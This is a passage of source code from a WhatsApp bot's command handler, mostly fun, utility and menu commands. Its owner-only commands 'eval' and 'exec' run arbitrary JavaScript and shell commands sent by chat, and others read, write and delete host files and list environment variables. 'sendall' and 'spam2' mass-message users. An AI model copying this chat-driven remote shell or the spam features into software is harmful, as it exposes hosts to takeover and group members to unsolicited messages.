      case "proverb": { const provs = ["The early bird catches the worm. 🐦","Actions speak louder than words. 💪","A stitch in time saves nine. ✂️","Don't count your chickens before they hatch. 🐣","Where there's smoke, there's fire. 🔥","All that glitters is not gold. ✨","Better late than never. ⏰","Practice makes perfect. 🎯","United we stand, divided we fall. 🤝","Rome wasn't built in a day. 🏛️","No pain, no gain. 💪","Knowledge is power. 📚","Time is money. ⏰","The pen is mightier than the sword. ✍️"]; mzazireply(`📜 *PROVERB*\n\n${provs[Math.floor(Math.random()*provs.length)]}`); break; }

      // ═══════════════════════════════════════════════════════
      //  EXTRA OWNER COMMANDS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "joingroup": { if (!isOwner) return mzazireply("❌ Owner only!"); if (!text) return mzazireply(`Usage: ${prefix}joingroup <invite link>`); try { const code3 = text.split("chat.whatsapp.com/").pop().split("?")[0]; await mzazi.groupAcceptInvite(code3); mzazireply("✅ Joined group!"); } catch(e) { mzazireply("❌ Failed to join group"); } break; }
//=====================================//

      case "getinvite": { if (!isOwner) return mzazireply("❌ Owner only!"); if (!text) return mzazireply(`Usage: ${prefix}getinvite <group id>`); try { const code4 = await mzazi.groupInviteCode(text.trim()); mzazireply(`🔗 Invite: https://chat.whatsapp.com/${code4}`); } catch(e) { mzazireply("❌ Failed"); } break; }
//=====================================//

      case "sendstatus": { if (!isOwner) return mzazireply("❌ Owner only!"); if (!text) return mzazireply(`Usage: ${prefix}sendstatus <message>`); try { await mzazi.sendMessage("status@broadcast", { text }); mzazireply("✅ Status posted!"); } catch(e) { mzazireply("❌ Failed to post status"); } break; }
//=====================================//

      case "groupnames": { if (!isOwner) return mzazireply("❌ Owner only!"); try { const gg = await mzazi.groupFetchAllParticipating(); const names = Object.values(gg).map((g,i) => `${i+1}. ${g.subject}`).join("\n"); mzazireply(`📋 *GROUP NAMES*\n\n${names}`); } catch(e) { mzazireply("❌ Failed"); } break; }
//=====================================//

      case "eval": { if (!isOwner) return mzazireply("❌ Owner only!"); if (!text) return mzazireply(`Usage: ${prefix}eval <code>`); try { let result5 = eval(text); if (typeof result5 !== "string") result5 = JSON.stringify(result5, null, 2); mzazireply(`✅ Result:\n${result5}`); } catch(e) { mzazireply(`❌ Error: ${e.message}`); } break; }
//=====================================//

      case "exec": { if (!isOwner) return mzazireply("❌ Owner only!"); if (!text) return mzazireply(`Usage: ${prefix}exec <command>`); const { exec: exec2 } = require("child_process"); exec2(text, (err, stdout, stderr) => { if (err) return mzazireply(`❌ ${err.message}`); mzazireply(`✅ Output:\n${stdout || stderr || "No output"}`); }); break; }
//=====================================//

      case "readfile": { if (!isOwner) return mzazireply("❌ Owner only!"); if (!text) return mzazireply(`Usage: ${prefix}readfile <path>`); try { const fileContent = fs.readFileSync(text, "utf8"); const preview = fileContent.slice(0,500); mzazireply(`📄 *FILE: ${text}*\n\n${preview}${fileContent.length > 500 ? "\n\n_...truncated_" : ""}`); } catch(e) { mzazireply(`❌ ${e.message}`); } break; }
//=====================================//

      case "writefile": { if (!isOwner) return mzazireply("❌ Owner only!"); const [filepath2, ...fileContent2] = text.split("|"); if (!filepath2 || !fileContent2.length) return mzazireply(`Usage: ${prefix}writefile path|content`); try { fs.writeFileSync(filepath2.trim(), fileContent2.join("|")); mzazireply(`✅ Written to ${filepath2.trim()}`); } catch(e) { mzazireply(`❌ ${e.message}`); } break; }
//=====================================//

      case "deletefile": { if (!isOwner) return mzazireply("❌ Owner only!"); if (!text) return mzazireply(`Usage: ${prefix}deletefile <path>`); try { fs.unlinkSync(text); mzazireply(`✅ Deleted: ${text}`); } catch(e) { mzazireply(`❌ ${e.message}`); } break; }
//=====================================//

      case "listfiles": { if (!isOwner) return mzazireply("❌ Owner only!"); const dir2 = text || "."; try { const files2 = fs.readdirSync(dir2); mzazireply(`📂 *FILES in ${dir2}*\n\n${files2.join("\n")}`); } catch(e) { mzazireply(`❌ ${e.message}`); } break; }
//=====================================//

      case "memory": { if (!isOwner) return mzazireply("❌ Owner only!"); const mem = process.memoryUsage(); mzazireply(`💾 *MEMORY USAGE*\n\nHeap Used: ${(mem.heapUsed/1024/1024).toFixed(2)} MB\nHeap Total: ${(mem.heapTotal/1024/1024).toFixed(2)} MB\nRSS: ${(mem.rss/1024/1024).toFixed(2)} MB\nExternal: ${(mem.external/1024/1024).toFixed(2)} MB`); break; }
//=====================================//

      case "gc":
//=====================================//

      case "garbagecollect": { if (!isOwner) return mzazireply("❌ Owner only!"); if (global.gc) { global.gc(); mzazireply("✅ Garbage collected!"); } else { mzazireply("⚠️ Run with --expose-gc flag to enable GC"); } break; }
//=====================================//

      case "env": { if (!isOwner) return mzazireply("❌ Owner only!"); const envKeys = Object.keys(process.env).filter(k => !["PATH","HOME","USER","SHELL"].includes(k)); mzazireply(`🔧 *ENV VARS*\n\n${envKeys.slice(0,20).join("\n")}${envKeys.length > 20 ? `\n...and ${envKeys.length - 20} more` : ""}`); break; }
//=====================================//

      case "uptime3": { mzazireply(`⏱️ *SYSTEM UPTIME*\n\nBot: ${runtime(process.uptime())}\nServer: ${runtime(os.uptime())}`); break; }
//=====================================//

      case "cpu": { const cpus2 = os.cpus(); mzazireply(`🖥️ *CPU INFO*\n\nModel: ${cpus2[0].model}\nCores: ${cpus2.length}\nSpeed: ${cpus2[0].speed} MHz`); break; }
//=====================================//

      case "disk": { mzazireply(`💿 *DISK INFO*\n\n_Use ${prefix}exec df -h for disk usage_`); break; }
//=====================================//

      case "network": { mzazireply(`🌐 *NETWORK INFO*\n\nInterfaces: ${Object.keys(os.networkInterfaces()).join(", ")}`); break; }
//=====================================//

      case "hostname": { mzazireply(`🖥️ *HOSTNAME*\n\n${os.hostname()}`); break; }
//=====================================//

      case "platform": { mzazireply(`💻 *PLATFORM*\n\n${os.platform()} (${os.arch()})`); break; }

      // ═══════════════════════════════════════════════════════
      //  EXTRA GROUP COMMANDS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "groupage": { if (!isGroup) return mzazireply("❌ Group only!"); const created = groupMetadata.creation ? new Date(groupMetadata.creation*1000) : null; mzazireply(`🗓️ *GROUP AGE*\n\n📛 ${groupName}\n📅 Created: ${created ? created.toLocaleDateString() : "Unknown"}\n⏰ Days old: ${created ? Math.floor((Date.now() - created.getTime()) / 86400000) : "?"}`); break; }
//=====================================//

      case "isadmin": { if (!isGroup) return mzazireply("❌ Group only!"); const mentioned8 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid; const checkJid = mentioned8?.[0] || msgSender; const checkIsAdmin = groupAdmins.includes(normalizeJid(checkJid)); mzazireply(`🔍 @${jidToNumber(checkJid)} is ${checkIsAdmin ? "✅ an ADMIN" : "❌ NOT an admin"}`); break; }
//=====================================//

      case "isingroup": { if (!isGroup) return mzazireply("❌ Group only!"); const mentioned9 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid; if (!mentioned9?.length) return mzazireply(`Usage: ${prefix}isingroup @user`); const checkMember = participants.some(p => normalizeJid(p.id) === normalizeJid(mentioned9[0])); mzazireply(`🔍 @${jidToNumber(mentioned9[0])} is ${checkMember ? "✅ IN this group" : "❌ NOT in this group"}`); break; }
//=====================================//

      case "kickinactive": { if (!isGroup) return mzazireply("❌ Group only!"); if (!isOwner) return mzazireply("❌ Owner only!"); mzazireply(`⚙️ *KICK INACTIVE*\n\nThis feature scans message history.\n_Currently not implemented - coming soon!_`); break; }
//=====================================//

      case "groupstats": { if (!isGroup) return mzazireply("❌ Group only!"); mzazireply(`📊 *GROUP STATISTICS*\n\n📛 Name: ${groupName}\n👥 Members: ${participants.length}\n👑 Admins: ${groupAdmins.length}\n👤 Regular: ${participants.length - groupAdmins.length}\n\n_${botName} Bot_`); break; }
//=====================================//

      case "muteall": { if (!isGroup) return mzazireply("❌ Group only!"); if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");  try { await mzazi.groupSettingUpdate(sender, "announcement"); mzazireply("🔇 Group muted! Only admins can send messages."); } catch(e) { mzazireply("❌ Failed"); } break; }
//=====================================//

      case "unmuteall": { if (!isGroup) return mzazireply("❌ Group only!"); if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!");  try { await mzazi.groupSettingUpdate(sender, "not_announcement"); mzazireply("🔊 Group unmuted!"); } catch(e) { mzazireply("❌ Failed"); } break; }
//=====================================//

      case "sendall": { if (!isGroup) return mzazireply("❌ Group only!"); if (!isOwner) return mzazireply("❌ Owner only!"); if (!text) return mzazireply(`Usage: ${prefix}sendall <message>`); const allM = participants.map(p=>normalizeJid(p.id)); for (const jid of allM) { try { await mzazi.sendMessage(jid, { text }); await new Promise(r=>setTimeout(r,200)); } catch(e) {} } mzazireply(`✅ Sent to all ${allM.length} members!`); break; }
//=====================================//

      case "extractemails": { const quoted6 = m.message?.extendedTextMessage?.contextInfo?.quotedMessage; const src = (quoted6?.conversation || quoted6?.extendedTextMessage?.text || text || ""); const emails = [...src.matchAll(/[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}/g)].map(m2=>m2[0]); mzazireply(emails.length ? `📧 *EMAILS FOUND*\n\n${emails.join("\n")}` : "❌ No emails found"); break; }
//=====================================//

      case "extractnumbers": { const quoted7 = m.message?.extendedTextMessage?.contextInfo?.quotedMessage; const src2 = (quoted7?.conversation || quoted7?.extendedTextMessage?.text || text || ""); const nums = [...src2.matchAll(/\+?[\d][\d\s\-()]{8,}/g)].map(m2=>m2[0].trim()); mzazireply(nums.length ? `📱 *NUMBERS FOUND*\n\n${nums.join("\n")}` : "❌ No numbers found"); break; }

      // ═══════════════════════════════════════════════════════
      //  SHORTCUTS & QUICK COMMANDS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "s": { const qS = m.message?.extendedTextMessage?.contextInfo?.quotedMessage; if (!qS) return mzazireply(`Reply to an image with ${prefix}s to make sticker`); const qSType = Object.keys(qS)[0]; const mS = qS.imageMessage || qS.videoMessage; if (!mS) return mzazireply("Only images or short videos!"); try { const bufS = await downloadMediaMessage({key:m.key,message:{[qSType]:mS}},"buffer",{},{logger:pino({level:"silent"}),reuploadRequest:mzazi.updateMediaMessage}); await mzazi.sendMessage(sender,{sticker:bufS},{quoted:m}); } catch(e) { mzazireply("❌ Sticker failed"); } break; }
//=====================================//

      case "p": { mzazireply(`🏓 ${Date.now()-startTime}ms`); break; }
//=====================================//

      case "o": { mzazireply(`👑 Owner: @${config.owner || botPhoneNum}\nTelegram: https://t.me/${config.owner || "mzazidev"}`); break; }
//=====================================//

      case "u": { mzazireply(`⏰ ${runtime(process.uptime())}`); break; }
//=====================================//

      case "i": { mzazireply(`🤖 ${botName}\n📱 ${botPhoneNum}\n⚡ Online`); break; }
//=====================================//

      case "m": { mzazireply(`📋 Use ${prefix}menu for all commands!`); break; }
//=====================================//

      case "h": { mzazireply(`💡 ${prefix}help for help, ${prefix}menu for commands`); break; }

      // ═══════════════════════════════════════════════════════
      //  FINAL MISC COMMANDS
      // ═══════════════════════════════════════════════════════

//=====================================//

      case "matrix": { let m2Text = ""; for (let i=0;i<8;i++){let row="";for(let j=0;j<8;j++)row+=(Math.random()>0.5?"1":"0")+" ";m2Text+=row.trim()+"\n";} mzazireply(`💻 *THE MATRIX*\n\n\`\`\`\n${m2Text}\`\`\``); break; }
//=====================================//

      case "hackfake": { const steps = ["Initializing hack sequence...","Bypassing firewall... ✅","Injecting payload... ✅","Accessing mainframe... ✅","Downloading data... ✅","HACK COMPLETE! 100%"]; mzazireply(`🖥️ *FAKE HACK*\n\n${steps.join("\n")}\n\n_Just for fun! 😅_`); break; }
//=====================================//

      case "glitch": { const glitch2 = ["S̵̡̲͚͎̣̅̒͑ͅy̴̘͊̀s̷̳̔t̸͉͝e̴̮̿m̷͇͋ ̸͔̑G̵̱͐l̵̪̑i̵̩̊t̸͍̋c̴͕̑h̴͇͆!","E̸̥̚r̸̢͝r̸͈͌o̸͙͘r̵̭̃ ̵͍͠4̶̠̋0̶͖̑4̵̩͂!","R̸̡̙̟̤͒̉e̶̢͍͉͒̅a̷͓͓̣̓͑l̷̠̍̓͝ȉ̸̢͚t̸̗͛y̴͎̓ ̴̠̀̂͘f̴͎̎r̵̙̫͉͊̾a̴̤̺͆c̴̯̮͐ṭ̷̜̆̉̃ư̶̭̘͐r̴̗̦̘̐͋̃e̶͕͓͑d̵̛̙͑̾!"]; mzazireply(`👾 *GLITCH*\n\n${glitch2[Math.floor(Math.random()*glitch2.length)]}`); break; }
//=====================================//

      case "fire": { mzazireply(`🔥🔥🔥\n🔥 FIRE! 🔥\n🔥🔥🔥\n\n_This is LIT!_`); break; }
//=====================================//

      case "spam2": { if (!isOwner) return mzazireply("❌ Owner only!"); if (!text) return mzazireply(`Usage: ${prefix}spam2 <message>`); for(let i=0;i<5;i++){await mzazi.sendMessage(sender,{text});await new Promise(r=>setTimeout(r,500));} break; }
//=====================================//

      case "snipe": { mzazireply(`🎯 *SNIPE*\n\n_Snipe feature reads deleted messages._\n_Currently tracking last deleted message..._`); break; }
//=====================================//

      case "autospam": { if (!isOwner) return mzazireply("❌ Owner only!"); mzazireply("⚠️ Auto-spam is disabled for safety reasons."); break; }
//=====================================//

      case "status2": { mzazireply(`🟢 ${botName} is *ONLINE*\n\n✅ All systems operational\n⚡ Commands responding\n💾 Memory: ${(process.memoryUsage().heapUsed/1024/1024).toFixed(0)} MB`); break; }
//=====================================//

      case "check": { mzazireply(`✅ *CHECK*\n\nBot: Online ✅\nCommands: Active ✅\nDatabase: Connected ✅\nPing: ${Date.now()-startTime}ms ⚡`); break; }
//=====================================//

      case "whoami": { mzazireply(`👤 *YOU ARE*\n\n📱 Number: +${senderNum}\n🆔 JID: ${msgSender}\n${isOwner ? "👑 Bot Owner" : isPaid ? "💎 Paid User" : isAdmin ? "🛡️ Group Admin" : "👤 Regular User"}\n${isGroup ? `👥 Group: ${groupName}` : "💬 Private Chat"}`); break; }
//=====================================//

      case "source": { mzazireply(`📂 *SOURCE CODE*\n\nOwner: ${prefix}downloadfile to get case.js\n\nGitHub: https://t.me/${config.owner || "mzazidev"}`); break; }
//=====================================//

      case "generate": { if (!text) return mzazireply(`Example: ${prefix}generate username`); const words3 = ["dark","neon","cyber","ghost","pixel","ultra","mega","hyper","alpha","omega","inferno","shadow","crystal","storm","matrix"]; const gen = words3[Math.floor(Math.random()*words3.length)] + Math.floor(Math.random()*999); mzazireply(`⚡ *GENERATOR*\n\n${text}: *${gen}*`); break; }
//=====================================//

      case "timestamp": { mzazireply(`⏱️ *TIMESTAMP*\n\nUnix: ${Date.now()}\nISO: ${new Date().toISOString()}\nUTC: ${new Date().toUTCString()}`); break; }
//=====================================//

      case "weekday": { const days3 = ["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"]; mzazireply(`📅 *DAY OF WEEK*\n\nToday is: *${days3[new Date().getDay()]}*`); break; }
//=====================================//

      case "isweekend": { const d2 = new Date().getDay(); mzazireply(d2===0||d2===6 ? "🎉 YES! It's the weekend!" : `💼 No, it's a weekday. ${5-d2} days until weekend!`); break; }
//=====================================//

      case "hours": { const h2 = new Date().getHours(); const greeting2 = h2<12 ? "Good morning! 🌅" : h2<17 ? "Good afternoon! ☀️" : h2<20 ? "Good evening! 🌇" : "Good night! 🌙"; mzazireply(`🕐 *TIME*\n\nHour: ${h2}:00\n${greeting2}`); break; }
//=====================================//

      case "year": { mzazireply(`📅 *YEAR*\n\nCurrent year: *${new Date().getFullYear()}*\nDays passed: ${Math.floor((Date.now()-new Date(new Date().getFullYear(),0,0))/(1000*60*60*24))}\nDays left: ${Math.floor((new Date(new Date().getFullYear()+1,0,0)-Date.now())/(1000*60*60*24))}`); break; }
//=====================================//

      case "age": { if (!text) return mzazireply(`Example: ${prefix}age 2000`); const birthYear = parseInt(text); if (isNaN(birthYear)) return mzazireply("❌ Invalid year"); const ageCalc = new Date().getFullYear() - birthYear; mzazireply(`🎂 *AGE CALCULATOR*\n\nBirth Year: ${birthYear}\nAge: *${ageCalc} years old*\n${ageCalc < 0 ? "🤔 Time traveler!" : ageCalc < 18 ? "🧒 Still young!" : ageCalc < 30 ? "🌟 In your prime!" : ageCalc < 60 ? "💪 Experienced!" : "👴 A legend!"}`); break; }
//=====================================//

      case "battery": { mzazireply(`🔋 *BATTERY STATUS*\n\nServer doesn't have a battery! 😄\nBot running on ${os.platform()}`); break; }
//=====================================//

      case "airplane": { mzazireply(`✈️ *AIRPLANE MODE*\n\nThis is WhatsApp, not a phone settings! 😂\nBot is always online! 🟢`); break; }
//=====================================//

      case "error": { mzazireply(`❌ *ERROR HELP*\n\nIf you see errors:\n1. Check your command syntax\n2. Make sure bot is admin (for group commands)\n3. Use ${prefix}help for usage\n4. Contact: @${config.owner || "the Owner to fix"}`); break; }
//=====================================//

      case "test3": { mzazireply(`✅ *TEST SUCCESSFUL*\n\nBot is working perfectly!\nPing: ${Date.now()-startTime}ms`); break; }
//=====================================//

      case "echo": { if (!text) return mzazireply(`Usage: ${prefix}echo <message>`); mzazireply(text); break; }
//=====================================//

      case "say": { if (!text) return mzazireply(`Usage: ${prefix}say <message>`); await mzazi.sendMessage(sender, { text }, { quoted: m }); break; }
      
//=====================================//

      case "sayme": { if (!text) return mzazireply(`Usage: ${prefix}sayme <message>`); await mzazi.sendMessage(sender, { text: `[${senderNum}]: ${text}` }); break; }
      
//=====================================//

      case "announce": { if (!isGroup) return mzazireply("❌ Group only!"); if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!"); if (!text) return mzazireply(`Usage: ${prefix}announce <message>`); await mzazi.sendMessage(sender, { text: `📢 *ANNOUNCEMENT*\n\n${text}` }); break; }
      
//=====================================//

      case "warning2": { if (!isGroup) return mzazireply("❌ Group only!"); if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!"); if (!text) return mzazireply(`Usage: ${prefix}warning2 @user <reason>`); const wTarget = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; if (!wTarget) return mzazireply("Mention a user!"); await mzazi.sendMessage(sender,{text:`⚠️ *WARNING*\n\n@${jidToNumber(wTarget)}, ${args.slice(1).join(" ")||"Please follow the rules!"}`,mentions:[wTarget]}); break; }
      
      
//=====================================//

      case "notice": { if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!"); if (!text) return mzazireply(`Usage: ${prefix}notice <message>`); mzazireply(`📌 *NOTICE*\n\n${text}\n\n_Posted by Admin_`); break; }
      
      
//=====================================//

      case "pin2": { if (!isAdmin && !isOwner) return mzazireply("❌ Admins only!"); if (!text) return mzazireply(`Usage: ${prefix}pin2 <message>`); mzazireply(`📌 *PINNED MESSAGE*\n\n${text}`); break; }
      
//=====================================//

      case "flashcard": { if (!text) return mzazireply(`Usage: ${prefix}flashcard Question | Answer`); const [q2, a2] = text.split("|").map(s=>s.trim()); if (!q2 || !a2) return mzazireply("Format: Question | Answer"); mzazireply(`📇 *FLASHCARD*\n\n❓ ${q2}\n\n||✅ ${a2}||`); break; }
      
      
//=====================================//

      case "todo": { if (!text) return mzazireply(`📝 *TO-DO LIST*\n\nUsage:\n${prefix}todo add Task name\n${prefix}todo list\n${prefix}todo clear`); const action2 = args[0]?.toLowerCase(); const taskText = args.slice(1).join(" "); const todoFile = `./database/sessions/${botPhoneNum}/todo_${senderNum}.json`; const todos = loadJSON(todoFile, []); if (action2 === "add") { if (!taskText) return mzazireply("Provide task text!"); todos.push({task:taskText,done:false,added:new Date().toLocaleString()}); saveJSON(todoFile, todos); mzazireply(`✅ Task added: ${taskText}`); } else if (action2 === "list") { if (!todos.length) return mzazireply("📭 No tasks!"); mzazireply(`📝 *YOUR TO-DO LIST*\n\n${todos.map((t,i)=>`${t.done?"✅":"⬜"} ${i+1}. ${t.task}`).join("\n")}`); } else if (action2 === "clear") { saveJSON(todoFile, []); mzazireply("✅ To-do list cleared!"); } else { mzazireply(`Use: add, list, clear`); } break; }
      
      
//=====================================//

      case "note": { if (!text) return mzazireply(`Usage: ${prefix}note <your note>`); const noteFile2 = `./database/sessions/${botPhoneNum}/notes_${senderNum}.json`; const notes2 = loadJSON(noteFile2, []); const action3 = args[0]?.toLowerCase(); if (action3 === "list") { if (!notes2.length) return mzazireply("📭 No notes!"); mzazireply(`📓 *YOUR NOTES*\n\n${notes2.map((n,i)=>`${i+1}. ${n.text}`).join("\n")}`); } else if (action3 === "clear") { saveJSON(noteFile2, []); mzazireply("✅ Notes cleared!"); } else { notes2.push({text,time:new Date().toLocaleString()}); saveJSON(noteFile2, notes2); mzazireply(`📝 Note saved! (${notes2.length} notes total)`); } break; }
      
      
//=====================================//

      case "reminder": { if (!text) return mzazireply(`Usage: ${prefix}reminder 5 Take medicine`); const [minStr, ...remText] = args; const mins = parseInt(minStr); if (isNaN(mins) || mins < 1) return mzazireply("Provide minutes (min 1)"); if (mins > 60) return mzazireply("Max 60 minutes!"); const remMsg = remText.join(" ") || "Reminder!"; mzazireply(`⏰ Reminder set for ${mins} minute(s)!\n\nI'll remind you: "${remMsg}"`); setTimeout(async () => { try { await mzazi.sendMessage(sender, { text: `⏰ *REMINDER*\n\n${remMsg}\n\n_Set ${mins} minute(s) ago_` }); } catch(e) {} }, mins * 60000); break; }
      
      
//=====================================//

      case "mute2": { if (!isGroup) return mzazireply("❌ Group only!"); const warnMTarget = m.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]; if (!warnMTarget) return mzazireply(`Usage: ${prefix}mute2 @user`); setGroupSetting(`${sender}_muted_${warnMTarget}`, "muted", true); mzazireply(`🔇 @${jidToNumber(warnMTarget)} has been muted!`); break; }
//=====================================//

      case "freebot": {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load local menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        // Single card with 4 buttons
        const card = {
            header: {
                title: `${botName.toUpperCase()}`,
                hasMediaAttachment: !!preparedImage,
                ...(preparedImage ? { imageMessage: preparedImage } : {})
            },
            body: { 
                text: `💰 *FREE BOT* 🚀\n\n🤖 Fully featured WhatsApp bot\n🔗 Quick pairing via Telegram\n⚡ 24/7 Active support\n📦 Open source & free` 
            },
            footer: { text: `© ${botName} • Tap any button below` },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: 'QUARTZ SERVER 1',
                            url: 'https://t.me/namelessmzaziv3Bot'
                        })
                    },
                    {
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: 'QUARTZ SERVER 2',
                            url: 'https://t.me/namelessmzazis2Bot'
                        })
                    },
                    {
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: 'QUARTZ SERVER 3',
                            url: 'https://t.me/namelessmzazis3bot'
                        })
                    },
                    {
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: 'MZAZI SIMPLE WEBSITE',
                            url: 'https://mzazi.shop'
                        })
                    }
                ]
            }
        };

        // Build message with single card (no carousel)
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `🛒 *${botName.toUpperCase()} REPOSITORY*` },
                    footer: { text: `© ${botName} • Tap any button` },
                    carouselMessage: { cards: [card] }, // Single card array
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363425539800408@newsletter",
                            newsletterName: botName.toUpperCase(),
                            serverMessageId: 143
                        }
                    }
                }
            },
            {} // No quoted – safe!
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Repo error:', error);
        
        // Fallback plain text with all links
        const fallbackText = 
`💰 *${botName.toUpperCase()} REPOSITORY* 💰

━━━━━━━━━━━━━━━━━━━━━

🤖 *FREE WhatsApp Bot*
🔗 Quick pairing via Telegram
⚡ 24/7 support
📦 Open source

━━━━━━━━━━━━━━━━━━━━━

*🔗 PAIRING LINKS:*
• Kenya: t.me/mzazitxmd_bot
• Africa: t.me/mzazitxmd_bot
• Others: t.me/mzazitxmd_bot

━━━━━━━━━━━━━━━━━━━━━
📢 *Channel*: whatsapp.com/channel/0029VbCIYMV77qVODCql8W17

━━━━━━━━━━━━━━━━━━━━━
© ${botName}`;

        await mzazireply(fallbackText);
    }
    break;
}
//=====================================//

    case "mzazi7": case "menu7": {
    const chatId = sender;
    const { generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

    try {
        // Load local menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let imageBuffer = null;
        let preparedImage = null;
        
        if (fs.existsSync(menuPicPath)) {
            imageBuffer = fs.readFileSync(menuPicPath);
            // We need to prepare the image message for the header
            const { generateWAMessageContent } = require('@whiskeysockets/baileys');
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        // Single card with 3 quick reply buttons
        const card = {
            header: {
                title: `${botName.toUpperCase()}`,
                hasMediaAttachment: !!preparedImage,
                ...(preparedImage ? { imageMessage: preparedImage } : {})
            },
            body: { 
                text: `🤖 *${botName.toUpperCase()} COMMANDS* 🤖\n\nTap any button below to execute a command.` 
            },
            footer: { text: `© ${botName} • Quick replies` },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "📋 GENERAL MENU",
                            id: ".generalmenu"
                        })
                    },{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "FUN & GAMES",
                            id: ".funmenu"
                        })
                    },{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "UTILITY TOOLS",
                            id: ".utilitymenu"
                        })
                    },{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "SEARCH & INFO",
                            id: ".searchmenu"
                        })
                    },{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "MEDIA & DOWNLOAD ",
                            id: ".downloadmenu"
                        })
                    },{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "GROUP MANAGEMENT ",
                            id: ".groupmenu"
                        })
                    },{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "GROUP PROTECTION",
                            id: ".protectionmenu"
                        })
                    },{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "OWNER COMMANDS",
                            id: ".ownermenu"
                        })
                    },{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "AUTO FEATURES ",
                            id: ".automenu"
                        })
                    },{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "LANGUAGES",
                            id: ".languagemenu"
                        })
                    },{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "BOT SETTINGS ",
                            id: ".settingsmenu"
                        })
                    },{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "LIFESTYLE",
                            id: ".lifestylemenu"
                        })
                    },{
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "FAITH",
                            id: ".faithmenu"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "CONNECT BOT",
                            id: ".freebot"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "SPEED",
                            id: ".ping"
                        })
                    }
                ]
            }
        };

        // Build interactive message with carousel (single card)
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `📌 *${botName.toUpperCase()} QUICK ACTIONS*` },
                    footer: { text: `© ${botName} • Tap a button` },
                    carouselMessage: { cards: [card] },
                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363425539800408@newsletter",
                            newsletterName: botName.toUpperCase(),
                            serverMessageId: 143
                        }
                    }
                }
            },
            {} // No quoted – safe!
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Repo quick reply error:', error);
        
        // Fallback: simple text with instructions
        const fallbackText = `🤖 *${botName.toUpperCase()}* 🤖

Use these command:
• ${prefix}allmenu

© ${botName}`;
        await mzazireply(fallbackText);
    }
    break;
}  
//=====================================//

case 'generalmenu': {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load local menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        const commonHeader = {
